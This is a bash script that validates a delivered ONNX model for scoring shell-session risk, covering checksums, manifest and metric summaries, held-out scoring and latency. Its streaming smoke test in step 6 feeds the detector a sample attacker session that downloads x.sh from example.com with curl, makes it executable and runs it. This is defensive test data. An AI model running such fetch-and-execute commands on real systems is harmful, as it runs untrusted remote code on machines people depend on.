#!/usr/bin/env bash
# Post-sync validation for a trained cmd-session-risk ONNX delivery.
#
# Usage: scripts/validate_delivery.sh <RUN_DIR> [TEST_JSONL]
#
# <RUN_DIR> is the artifact directory that contains onnx/, metrics.json and
# export/calibration outputs.  The script never mutates the artifact: it only
# verifies checksums, loads the graph, scores a held-out slice, exercises the
# streaming API and measures CPU latency.
set -euo pipefail

RUN_DIR="${1:?usage: validate_delivery.sh <RUN_DIR> [TEST_JSONL]}"
TEST_JSONL="${2:-data/processed/v2/test.jsonl}"
PY="${PY:-.venv/bin/python}"
CLI="${CLI:-.venv/bin/cmdrisk}"
ONNX_DIR="$RUN_DIR/onnx"

echo "=== 1. artifact layout ==="
find "$RUN_DIR" -maxdepth 2 -type f | sort

echo
echo "=== 2. checksum verification (onnx/) ==="
if [[ -f "$ONNX_DIR/SHA256SUMS" ]]; then
  (cd "$ONNX_DIR" && sha256sum -c SHA256SUMS)
else
  echo "WARN: no SHA256SUMS in $ONNX_DIR"
fi

echo
echo "=== 3. export manifest, parity, promotion ==="
"$PY" - "$ONNX_DIR" <<'PYEOF'
import json, sys
from pathlib import Path

d = Path(sys.argv[1])
mf = d / "export_manifest.json"
if not mf.is_file():
    print("WARN: export_manifest.json missing")
    raise SystemExit(0)
m = json.loads(mf.read_text())
print(f"schema/version    : {m.get('schema')} v{m.get('version')}")
print(f"opset             : {m.get('opset')}")
print(f"fp32_model        : {m.get('fp32_model')}")
print(f"int8_model        : {m.get('int8_model')}")
print(f"fp32 parity       : max_abs_error={m.get('parity_max_abs_error')} atol={m.get('parity_atol')}")
print(f"int8 parity       : max_abs_error={m.get('int8_parity_max_abs_error')} atol={m.get('int8_parity_atol')}")
for key in ("parameter_count", "param_count", "parameters"):
    if key in m:
        print(f"parameter_count   : {m[key]}")
        break
promo = m.get("promotion")
if isinstance(promo, dict):
    print(f"promotion.passed  : {promo.get('passed')}  (required={promo.get('required')})")
    print(f"  metrics_passed  : {promo.get('metrics_passed')}")
    print(f"  latency_passed  : {promo.get('latency_passed')}")
    print(f"  failures        : {promo.get('failures')}")
artifacts = m.get("artifacts")
if isinstance(artifacts, dict):
    print(f"declared files    : {len(artifacts)}")
    for name, entry in sorted(artifacts.items()):
        size = entry.get("size") if isinstance(entry, dict) else None
        print(f"  - {name:32} size={size}")
PYEOF

echo
echo "=== 4. parameter count from graph ==="
"$PY" - "$ONNX_DIR" <<'PYEOF'
import sys
from pathlib import Path

try:
    import onnx
except Exception as exc:  # pragma: no cover
    print(f"WARN: onnx unavailable: {exc}")
    raise SystemExit(0)

path = Path(sys.argv[1]) / "model.onnx"
model = onnx.load(str(path), load_external_data=False)
total = 0
for initializer in model.graph.initializer:
    count = 1
    for dim in initializer.dims:
        count *= int(dim)
    total += count
print(f"initializer parameters: {total}")
PYEOF

echo
echo "=== 4b. metrics.json slice summary ==="
"$PY" - "$RUN_DIR" <<'PYEOF'
import json, sys
from pathlib import Path

run = Path(sys.argv[1])
mf = run / "metrics.json"
if not mf.is_file():
    print("WARN: metrics.json missing")
    raise SystemExit(0)
m = json.loads(mf.read_text())
KEYS = ("recall", "fpr", "pr_auc", "roc_auc", "brier", "ece", "threshold",
        "positive_count", "negative_count")

def emit(tag, blob):
    if not isinstance(blob, dict):
        return
    print(f"-- {tag}")
    print("   " + "  ".join(f"{k}={blob[k]}" for k in KEYS if k in blob))

slices = m.get("slices") if isinstance(m.get("slices"), dict) else None
if slices:
    for name, blob in slices.items():
        mm = blob.get("malicious", blob) if isinstance(blob, dict) else blob
        emit(f"slice {name}", mm)
else:
    emit("overall", m.get("malicious", m))

dd = m.get("detection_delay")
if isinstance(dd, dict):
    print("detection_delay:",
          {k: dd.get(k) for k in ("detection_rate", "detected_sessions",
                                   "malicious_sessions", "median_detection_delay_commands",
                                   "median_censored_detection_delay_commands")})
for key in ("tactic", "technique"):
    blob = m.get(key)
    if isinstance(blob, dict):
        print(f"{key}_macro_f1    :", blob.get("macro_f1"))
pr = m.get("promotion")
if isinstance(pr, dict):
    print("promotion.passed  :", pr.get("passed"))
    print("promotion.violations:", pr.get("violations"))
    print("promotion.checks  :", pr.get("checks"))
PYEOF

echo "=== 5. CLI score over held-out slice ==="
if [[ -f "$TEST_JSONL" ]]; then
  "$CLI" score --artifact-dir "$ONNX_DIR" --input "$TEST_JSONL" \
      --output "$RUN_DIR/validation_scores.jsonl" --flat
  echo "wrote $RUN_DIR/validation_scores.jsonl ($(wc -l < "$RUN_DIR/validation_scores.jsonl") lines)"
else
  echo "WARN: missing $TEST_JSONL"
fi

echo
echo "=== 6. streaming API smoke ==="
printf '%s\n' '{"cmd":"whoami","dt":0}' '{"cmd":"uname -a","dt":2.1}' \
  '{"cmd":"curl -s http://example.com/x.sh -o /tmp/x","dt":3.0}' \
  '{"cmd":"chmod +x /tmp/x","dt":1.1}' '{"cmd":"/tmp/x","dt":0.4}' \
  | "$CLI" stream --artifact-dir "$ONNX_DIR" --session-id live-1

echo
echo "=== 7. CPU latency benchmark ==="
"$PY" scripts/latency_bench.py --artifact-dir "$ONNX_DIR" \
    --iterations "${ITERATIONS:-100}" --format table --allow-failure || true

echo
echo "=== validation complete ==="
